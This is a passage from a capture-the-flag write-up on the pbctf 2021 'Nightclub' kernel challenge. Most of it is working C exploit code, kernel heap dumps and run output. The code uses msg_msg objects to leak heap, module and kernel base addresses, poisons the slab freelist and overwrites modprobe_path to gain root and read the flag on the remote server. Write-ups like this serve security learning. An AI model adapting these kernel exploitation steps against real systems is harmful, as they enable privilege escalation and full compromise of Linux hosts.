<figure class="highlight"><pre><code class="language-text" data-lang="text">0xffff888003fcf400:	0xffffffffc0002100	0xffff888003fcf580  &lt;= chunk 1 (uid[0])
0xffff888003fcf410:	0x0000000000000000	0x0000000000000000
0xffff888003fcf420:	0x0000000000000000	0x0000000000000000
0xffff888003fcf430:	0x0000000000000000	0x0000000005aa9c92
0xffff888003fcf440:	0x0000000000000000	0x0000000000000000
0xffff888003fcf450:	0x0000000000000000	0x0000000000000000
0xffff888003fcf460:	0x4141414141414141	0x4141414141414141
0xffff888003fcf470:	0x4141414141414141	0x4141414141414141
0xffff888003fcf480:	0xdead000000000100	0xdead000000000122  &lt;= freed chunk 2 (uid[1])
0xffff888003fcf490:	0x0000000000000000	0x0000000000000000
0xffff888003fcf4a0:	0x0000000000000000	0x0000000000000000
0xffff888003fcf4b0:	0x0000000000000000	0x00000000c5438ea4
0xffff888003fcf4c0:	0xffff888003fcf700	0x0000000000000000
0xffff888003fcf4d0:	0x0000000000000001	0x0000000000000001
0xffff888003fcf4e0:	0x4141414141414141	0x4141414141414141
0xffff888003fcf4f0:	0x4141414141414141	0x4141414141414141
0xffff888003fcf500:	0x0000000000000000	0x5858585858585858  &lt;= msg_seq
0xffff888003fcf510:	0x5858585858585858	0x5858585858585858
0xffff888003fcf520:	0x5858585858585858	0x5858585858585858
0xffff888003fcf530:	0x5858585858585858	0x5858585858585858
0xffff888003fcf540:	0x5858585858585858	0x5858585858585858
0xffff888003fcf550:	0x5858585858585858	0x5858585858585858
0xffff888003fcf560:	0x5858585858585858	0x5858585858585858
0xffff888003fcf570:	0x5858585858585858	0x4141414141414141
0xffff888003fcf580:	0xffff888003fcf400	0xffff888003fcf600  &lt;= chunk 4 (uid[3])
0xffff888003fcf590:	0x0000000000000000	0x0000000000000000
0xffff888003fcf5a0:	0x0000000000000000	0x0000000000000000
0xffff888003fcf5b0:	0x0000000000000000	0x00000000fbf11440
0xffff888003fcf5c0:	0x0000000000000000	0x0000000000000000
0xffff888003fcf5d0:	0x0000000000000003	0x0000000000000003
0xffff888003fcf5e0:	0x4141414141414141	0x4141414141414141
0xffff888003fcf5f0:	0x4141414141414141	0x4141414141414141
0xffff888003fcf600:	0xffff888003fcf500	0xffff888003fcf680  &lt;= chunk 5 (uid[4])
0xffff888003fcf610:	0x0000000000000000	0x0000000000000000
0xffff888003fcf620:	0x0000000000000000	0x0000000000000000
0xffff888003fcf630:	0x0000000000000000	0x0000000005c67703
0xffff888003fcf640:	0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>Freeing chunk 5 will now trigger the unlink in <code class="language-plaintext highlighter-rouge">del_chunk</code>, which will write the <code class="language-plaintext highlighter-rouge">prev</code> pointer of chunk 5 (<code class="language-plaintext highlighter-rouge">0xffff888003fcf680</code>) to the <code class="language-plaintext highlighter-rouge">next</code> pointer of chunk 3, which is our <code class="language-plaintext highlighter-rouge">msg_seq</code> object.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0xffff888003fcf4f0:	0x4141414141414141	0x4141414141414141
0xffff888003fcf500:	0x0000000000000000	0xffff888003fcf680  &lt;= chunk 3 / msg_seq
0xffff888003fcf510:	0x5858585858585858	0x5858585858585858
0xffff888003fcf520:	0x5858585858585858	0x5858585858585858
0xffff888003fcf530:	0x5858585858585858	0x5858585858585858
0xffff888003fcf540:	0x5858585858585858	0x5858585858585858
0xffff888003fcf550:	0x5858585858585858	0x5858585858585858
0xffff888003fcf560:	0x5858585858585858	0x5858585858585858
0xffff888003fcf570:	0x5858585858585858	0x4141414141414141
0xffff888003fcf580:	0xffff888003fcf400	0xffff888003fcf600</code></pre></figure>

<p>Now we can just <code class="language-plaintext highlighter-rouge">msgrcv</code> the complete message, which will contain the <code class="language-plaintext highlighter-rouge">prev</code> pointer at offset <code class="language-plaintext highlighter-rouge">0xfd8</code> :)</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">Kernel leak      : 0xffff888003fcf680
Message base     : 0xffff888003fcf400</code></pre></figure>

<p>Though in hindsight, it wasn’t really needed, but at that point, I was so afraid, that something might break later on, that I decided to “repair” the “heap” and fixed all addresses in the chunks and reallocated them to get back into a “clean” state…</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">printf</span><span class="p">(</span><span class="s">"Change heap to original state</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">uid</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">add_chunk</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
<span class="n">uid</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">add_chunk</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
<span class="n">uid</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">add_chunk</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
        
<span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">buf</span><span class="o">+</span><span class="mh">0x10</span><span class="p">;</span>

<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">msgbase</span> <span class="o">+</span> <span class="mh">0x180</span><span class="p">;</span> <span class="c1">// 0xffff888003fcf580;</span>
<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">msgbase</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">;</span> <span class="c1">// 0xffff888003fcf500;</span>

<span class="n">edit_chunk</span><span class="p">(</span><span class="n">uid</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>

<span class="n">ptr</span> <span class="o">=</span> <span class="n">buf</span><span class="o">+</span><span class="mh">0x10</span><span class="p">;</span>

<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">msgbase</span><span class="p">;</span>         <span class="c1">//  0xffff888003fcf400;</span>
<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">msgbase</span> <span class="o">+</span> <span class="mh">0x280</span><span class="p">;</span> <span class="c1">// 0xffff888003fcf680;</span>

<span class="n">edit_chunk</span><span class="p">(</span><span class="n">uid</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>

<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="n">del_chunk</span><span class="p">(</span><span class="n">uid</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    
<span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">);</span>
<span class="n">uid</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">add_chunk</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span> 
<span class="n">uid</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">add_chunk</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span> 
<span class="n">uid</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">add_chunk</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span> 
<span class="n">uid</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">add_chunk</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span> 
<span class="n">uid</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">add_chunk</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span> 
<span class="n">uid</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">add_chunk</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span> </code></pre></figure>

<p>Still, we only have a leak to our kernel heap, but don’t know the kernel base address. But since the module gave us the offset from <code class="language-plaintext highlighter-rouge">kmalloc</code> to <code class="language-plaintext highlighter-rouge">edit_chunk</code>, all we need for this is a leak to a module address.</p>

<p>Since we now know, where our chunks are allocated in kernel space, we can use the <code class="language-plaintext highlighter-rouge">0x10</code> byte overwrite to point the <code class="language-plaintext highlighter-rouge">next</code> pointer of any chunk to an arbitrary address inside the heap.</p>

<p>With this, we can now create a <code class="language-plaintext highlighter-rouge">msg_msg</code> object with size <code class="language-plaintext highlighter-rouge">0x80</code> and let a <code class="language-plaintext highlighter-rouge">next</code> pointer point to it, to edit its size to leak the complete heap.</p>

<p>Also the last allocated chunk will have its <code class="language-plaintext highlighter-rouge">prev</code> pointer pointing to <code class="language-plaintext highlighter-rouge">master_list</code>, which is in the data section of our module, so we just have to allocate one chunk after the <code class="language-plaintext highlighter-rouge">msg_msg</code> object to get that.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Allocate a msg_msg struct in the heap</span>
<span class="n">msgalloc</span><span class="p">(</span><span class="n">qid2</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">);</span>        
    
<span class="c1">// Add a chunk after the msg_msg, which contains pointer to master_list</span>
<span class="n">uid</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">add_chunk</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    
<span class="c1">// Overwrite next pointer of chunk 2 with pointer to msg_msg-&gt;size</span>
<span class="n">ptr</span> <span class="o">=</span> <span class="n">buf</span><span class="o">+</span><span class="mh">0x10</span><span class="p">;</span>
<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">msgbase</span> <span class="o">+</span> <span class="mh">0x310</span> <span class="o">-</span> <span class="mh">0x60</span><span class="p">;</span>  <span class="c1">// msg_msg-&gt;size - 0x60;</span>
<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">msgbase</span> <span class="o">+</span> <span class="mh">0x180</span><span class="p">;</span>         

<span class="n">edit_chunk</span><span class="p">(</span><span class="n">uid</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    
<span class="c1">// Overwrite size of msg_msg via corrupted next chunk</span>
<span class="n">ptr</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>    
<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>

<span class="n">edit_chunk</span><span class="p">(</span><span class="mh">0x4242424242424242</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>

<span class="c1">// Receive msg_msg with corrupted size</span>
<span class="n">msgrcv</span><span class="p">(</span><span class="n">qid2</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">module_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span><span class="o">+</span><span class="mh">0x60</span><span class="p">));</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">module_base</span> <span class="o">=</span> <span class="n">module_addr</span> <span class="o">-</span> <span class="mh">0x2100</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kmalloc</span> <span class="o">=</span> <span class="n">module_base</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="n">leak</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kbase</span> <span class="o">=</span> <span class="n">kmalloc</span> <span class="o">-</span> <span class="mh">0x1caa50</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">modprobe</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x144fca0</span><span class="p">;</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"module addr : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">module_addr</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"module base : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">module_base</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"kmalloc     : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kmalloc</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"kbase       : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"modprobe    : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modprobe</span><span class="p">);</span></code></pre></figure>

<p>The <code class="language-plaintext highlighter-rouge">next</code> pointer of chunk 0 will point to <code class="language-plaintext highlighter-rouge">msg_msg-&gt;msg_type - 0x60</code>, so that its <code class="language-plaintext highlighter-rouge">message</code> will overlap <code class="language-plaintext highlighter-rouge">msg_type / msg_size / msg_next</code> of the <code class="language-plaintext highlighter-rouge">msg_msg</code> struct. The <code class="language-plaintext highlighter-rouge">msg_uid</code> for this fake chunk now is inside the <code class="language-plaintext highlighter-rouge">message</code> from chunk 0, so we can just use <code class="language-plaintext highlighter-rouge">0x4242424242424242</code> as <code class="language-plaintext highlighter-rouge">msg_uid</code> to edit the fake chunk.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0xffff888003fcf650:	0x0000000000000001	0x0000000000000001
0xffff888003fcf660:	0x4242424242424242	0x4242424242424242
0xffff888003fcf670:	0x0101010101010101	0x0101010101010101
0xffff888003fcf680:	0xffff888003fcf6b0	0xffff888003fcf580  &lt;= chunk 0 (corrupted next)
0xffff888003fcf690:	0x0000000000000000	0x0000000000000000
0xffff888003fcf6a0:	0x0000000000000000	0x0000000000000000
0xffff888003fcf6b0:	0x0000000000000000	0x000000002aabd8f7  &lt;= fake chunk
0xffff888003fcf6c0:	0x0000000000000000	0x0000000000000000
0xffff888003fcf6d0:	0x0000000000000000	0x0000000000000000
0xffff888003fcf6e0:	0x4242424242424242	0x4242424242424242  &lt;= fake chunk msg_uid
0xffff888003fcf6f0:	0x0000000000000000	0x0000000000000000
0xffff888003fcf700:	0xffff888003fd3dc0	0xffff888003fd3dc0  &lt;= msg_msg struct
0xffff888003fcf710:	0x0000000000000001	0x0000000000001000  &lt;= msg_type / msg_size (now 0x1000)
0xffff888003fcf720:	0x0000000000000000	0xffff888003fbf200
0xffff888003fcf730:	0x0101010101010101	0x0101010101010101
0xffff888003fcf740:	0x0101010101010101	0x0101010101010101
0xffff888003fcf750:	0x0101010101010101	0x0101010101010101
0xffff888003fcf760:	0x0101010101010101	0x0101010101010101
0xffff888003fcf770:	0x0101010101010101	0x0101010101010101
0xffff888003fcf780:	0xffff888003fcf400	0xffffffffc0002100  &lt;= prev (master_list)
0xffff888003fcf790:	0x0000000000000000	0x0000000000000000
0xffff888003fcf7a0:	0x0000000000000000	0x0000000000000000
0xffff888003fcf7b0:	0x0000000000000000	0x0000000030e46069</code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">module addr : 0xffffffffc0002100
module base : 0xffffffffc0000000
kmalloc     : 0xffffffff811caa50
kbase       : 0xffffffff81000000
modprobe    : 0xffffffff8244fca0</code></pre></figure>

<p>Ok, getting somewhere :)</p>

<p>Since I was still convinced at that point, that those address checks were meant to not allow us adding/editing chunks anywhere outside of the module heap and I wanted to overwrite <code class="language-plaintext highlighter-rouge">modprobe_path</code>, I decided that I need another leak to <code class="language-plaintext highlighter-rouge">freelist</code>, so that I can allocate a <code class="language-plaintext highlighter-rouge">msg_msg</code> object directly on top of <code class="language-plaintext highlighter-rouge">modprobe_path</code>.</p>

<p>While I found a leak in my local qemu environment in the same region as the notes were placed, when I finished the exploit and tried to run it remote, it was nowhere to be found anymore :’(</p>

<p>In the end, finding a proper address to leak from, which works local and remote took more time than the complete exploit itself. But, after some time, I found a stable leak at <code class="language-plaintext highlighter-rouge">modprobe_path + 0xec520</code>, which worked on both environments.</p>

<p>To read it, I created another <code class="language-plaintext highlighter-rouge">msg_msg</code> struct in the module heap and overwrote <code class="language-plaintext highlighter-rouge">msg_size</code> and <code class="language-plaintext highlighter-rouge">msg_next</code> of it. Receiving that message, will then also read the <code class="language-plaintext highlighter-rouge">msg_seq</code> part from our corrupted <code class="language-plaintext highlighter-rouge">msg_next</code> (<code class="language-plaintext highlighter-rouge">modprobe_path + 0xec520</code>), with which we get a leak from the kernel memory region of the freelist for <code class="language-plaintext highlighter-rouge">0x80</code> chunks.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">qid3</span> <span class="o">=</span> <span class="n">msg_open</span><span class="p">();</span>
<span class="n">msgalloc</span><span class="p">(</span><span class="n">qid3</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">);</span>

<span class="n">ptr</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>    
<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x1400</span><span class="p">;</span>              <span class="c1">// msg_msg-&gt;msg_size</span>
<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">modprobe</span><span class="o">+</span><span class="mh">0xec520</span><span class="p">;</span>    <span class="c1">// msg_msg-&gt;msg_next</span>
<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">msgbase</span><span class="o">-</span><span class="mh">0x10198</span><span class="p">;</span>

<span class="c1">// overwrite msg_next of msg_msg object</span>
<span class="n">edit_chunk</span><span class="p">(</span><span class="mh">0x4242424242424242</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    
<span class="n">msgrcv</span><span class="p">(</span><span class="n">qid3</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x1400</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">target</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span><span class="o">+</span><span class="mh">0xfe8</span><span class="p">));</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cache_target</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="mh">0xee00</span><span class="p">;</span>

<span class="n">printf</span><span class="p">(</span><span class="s">"Target       : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">target</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"Cache target : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cache_target</span><span class="p">);</span></code></pre></figure>

<p>Now we can just overwrite the freelist pointer with a pointer to <code class="language-plaintext highlighter-rouge">modprobe_path-0x30</code>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Overwrite a next ptr with a pointer into freelist</span>
<span class="n">ptr</span> <span class="o">=</span> <span class="n">buf</span><span class="o">+</span><span class="mh">0x10</span><span class="p">;</span>
<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">cache_target</span><span class="o">-</span><span class="mh">0x70</span><span class="o">+</span><span class="mi">4</span><span class="p">;</span>
<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">msgbase</span><span class="p">;</span> 

<span class="n">edit_chunk</span><span class="p">(</span><span class="n">uid</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>

<span class="c1">// Overwrite 0x80 freelist with modprobe - 0x30    </span>
<span class="n">ptr</span> <span class="o">=</span> <span class="n">buf</span><span class="o">+</span><span class="mi">4</span><span class="p">;</span>
<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">modprobe</span><span class="o">-</span><span class="mh">0x30</span><span class="p">;</span>
<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x82</span><span class="p">;</span>
    
<span class="n">edit_chunk</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span></code></pre></figure>

<p>And all that’s left is to allocate another <code class="language-plaintext highlighter-rouge">msg_msg</code> with which we can now overwrite <code class="language-plaintext highlighter-rouge">modprobe_path</code> and trigger the usual copy flag modprobe exploit.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Allocate a msg_msg overwriting modprobe_path</span>
<span class="kt">int</span> <span class="n">qid4</span> <span class="o">=</span> <span class="n">msg_open</span><span class="p">();</span>

<span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
<span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">);</span>
<span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="o">+</span><span class="mh">0x30</span><span class="p">,</span> <span class="s">"/home/user/copy.sh"</span><span class="p">);</span>
    
<span class="n">msgalloc</span><span class="p">(</span><span class="n">qid4</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">);</span>
<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>

<span class="c1">// Execute modprobe_path exploitation</span>
<span class="n">system</span><span class="p">(</span><span class="s">"/home/user/dummy"</span><span class="p">);</span>
<span class="n">system</span><span class="p">(</span><span class="s">"cat /home/user/flag"</span><span class="p">);</span> </code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
[*] Compile
[+] Opening connection to nightclub.chal.perfect.blue on port 1337: Done
[*] Booting
[+] Starting local process './pow.sh': pid 24719
s.AAAy2OakJIUO0OKNAUcWDhhh3XicEhe8635vqaJMg5b5TqTX31Eod3sQ0R8RftFHLRjooKczpAygmNzguBxumaYtcrr3YIWbK2m6M4bliCxaJMwRHvb4XDk9fABMZbpkLzF8HHnmOV9NKtg79zR6rNTlqO2oerw99pg63DY6oAZ8nPDWcWsMk/egdo2y320qZssev4mTRtMs0/y3UXjphcNQ

[+] Upload: Done
[*] Switching to interactive mode
$ ./pwn
./pwn
Kernel leak   : 0xffffa1e80207c480
Message base  : 0xffffa1e80207c200
module addr   : 0xffffffffc0100100
module base   : 0xffffffffc00fe000
kmalloc       : 0xffffffffb61caa50
kbase         : 0xffffffffb6000000
modprobe      : 0xffffffffb744fca0
Target        : 0xffffa1e81f41dd40
Cache target  : 0xffffa1e81f42cb40
/home/user/dummy: 1: /home/user/dummy: \xff\xff\xff\xff: not found
pbctf{1_am_4ll_4b0ut_n1gh7lif3_cuz_i_h4ck_at_n1gh7}</code></pre></figure>


    <aside class="share">

      <span>Share this: </span>

      <a href="http://twitter.com/share?text=pbctf 2021 - Nightclub&amp;url=https://kileak.github.io/ctf/2021/pb21-nightclub/"
      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <i class="icon icon-twitter-rounded"></i>
      </a>

      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2021/pb21-nightclub/"
      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <i class="icon icon-facebook-rounded"></i>
      </a>

    </aside>
  </div>

  
  <hr>
  <aside id="comments" class="disqus">
    <div class="container">
      <h3><i class="icon icon-comments-o"></i> Comments</h3>
      <div id="disqus_thread"></div>

      <script type="text/javascript">
        var disqus_shortname = 'kileak';
        var disqus_identifier = '/ctf/2021/pb21-nightclub';
        var disqus_title = 'pbctf 2021 - Nightclub';
        var disqus_url = 'https://kileak.github.io/ctf/2021/pb21-nightclub';

        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>

      <noscript>
        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
      </noscript>
    </div>
  </aside>



</article>

        </section>

        
<div class="clearfix"></div>

<footer class="site-footer txt-center">
  <hr>

  <ul class="social">
    
  </ul>

  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>

</footer>


    </main>

    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

    <script src="/js/jquery.min.js"></script>
    <script src="/js/jekyll-search.min.js"></script>
    <script src="/js/main.js"></script>
  </body>
</html>
